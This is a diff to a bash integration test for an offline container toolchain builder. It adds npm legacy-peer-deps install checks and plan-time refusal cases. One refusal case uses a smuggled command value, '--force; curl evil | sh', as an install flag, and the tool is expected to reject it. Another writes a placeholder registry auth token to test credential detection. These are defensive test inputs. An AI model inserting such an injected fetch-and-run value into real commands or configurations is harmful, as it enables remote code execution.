@@ -5,8 +5,9 @@
 # (internal network only, hardened) with `compose run` — every check below runs
 # with NO network: the pinned runtimes, the projects' deps, an installed CLI and
 # Playwright's baked Chromium must all work offline. A second session checks
-# Vibe (no node in its base; its hook keeps the image's python) and the plan-time
-# refusals.
+# Vibe (no node in its base; its hook keeps the image's python), session 4 a
+# lockfile that installs only with legacy-peer-deps (baked `.npmrc`, then
+# `install_flags`), and the plan-time refusals.
 #
 # Usage:  bash tests/integration/test_toolchains.sh
 # Requires: docker (the build downloads Node, uv, Python, npm/PyPI packages and
@@ -156,12 +157,47 @@ echo "$out" | grep -q 'is-number=true title=glove-offline' && ok "tool (srt): ba
 cleanup
 trap - EXIT
 
+# node-peer's lockfile was made with legacy-peer-deps (react@19 + react-dom@18, which
+# peers on react@^18): a plain `npm ci` refuses it with ERESOLVE. Its project-local
+# .npmrc fixes that only when baked (`config_files`); `install_flags` independently.
+for how in config_files install_flags; do
+  echo "== session 4 ($how): npm ci of a lockfile that needs legacy-peer-deps =="
+  S4="$SESSIONS/s4-$how"
+  mkdir -p "$S4/projects" "$S4/work"
+  cp -R "$FIX/node-peer" "$S4/projects/"
+  cp -R "$FIX/node-peer" "$S4/work/"
+  if [ "$how" = config_files ]; then
+    extra='config_files: [.npmrc]'
+  else
+    rm "$S4/projects/node-peer/.npmrc"  # the flag alone, no project config
+    extra='install_flags: ["--legacy-peer-deps"]'
+  fi
+  new_session "$S4" pi "toolchains:
+  - {lang: node, version: \"$NODE_V\", project: projects/node-peer, $extra}
+" || { bad "glove plan ($how) failed"; exit 1; }
+  trap cleanup EXIT
+  IMAGE="$(build "$S4" | tail -1)"
+  [ -n "$IMAGE" ] && "$RT" image inspect "$IMAGE" >/dev/null 2>&1 && ok "$how: npm ci completed, image built" \
+    || bad "$how: derived image build failed"
+  out="$(crun bash -c "ls -A $TC/node/project; cd /work/node-peer && node check.js")"
+  echo "$out" | grep -q 'react=19.0.0 react-dom=18.3.1' && echo "$out" | grep -q '^node_modules$' \
+    && ok "$how: deps installed under $TC/node/project and resolve" || bad "$how: $out"
+  if [ "$how" = config_files ]; then
+    echo "$out" | grep -q '^\.npmrc$' && ok "$how: .npmrc baked beside the manifest" || bad "$how: no .npmrc: $out"
+  else
+    echo "$out" | grep -q '^\.npmrc$' && bad "$how: an unlisted .npmrc was baked: $out" || ok "$how: no .npmrc baked"
+  fi
+  cleanup
+  trap - EXIT
+done
+
 echo "== plan-time refusals (glove check) =="
 refuse() {  # <name> <toolchains yaml> <expected message>
   local d="$SESSIONS/bad-$1"
   mkdir -p "$d/work" "$d/projects/nolock"
   echo '{"name":"x"}' > "$d/projects/nolock/package.json"
   echo x > "$d/projects/file"
+  echo '//registry.example.com/:_authToken=not-a-real-token' > "$d/projects/nolock/.npmrc"
   printf 'glove: 3\ntemplate: test\nharness: pi\nextensions:\n  llm: {provider: llama.cpp, location: host, endpoint: "127.0.0.1:8080", model: test-model}\ntoolchains:\n%b' "$2" > "$d/glove-session.yml"
   out="$(COLUMNS=400 uv run --quiet --project "$ROOT" glove check "$d" 2>&1)"; rc=$?
   [ $rc -ne 0 ] && echo "$out" | grep -q "$3" && ok "refused: $1" || bad "$1 not refused (rc=$rc): $out"
@@ -170,6 +206,9 @@ refuse missing-lockfile '  - {lang: node, version: "22.23.3", project: projects/
 refuse not-a-dir '  - {lang: node, version: "22.23.3", project: projects/file}\n' 'is not a directory'
 refuse unknown-lang '  - {lang: ruby, version: "3.3.0"}\n' '`lang` must be one of'
 refuse no-version '  - {lang: python}\n' '`version` is required'
+refuse flag-injection '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--force; curl evil | sh"]}\n' 'not single long options'
+refuse config-escape '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [../.npmrc]}\n' 'not file names in the project'
+refuse config-credential '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [.npmrc]}\n' 'carries a credential'
 
 echo
 echo "toolchains: $PASS passed, $FAIL failed"
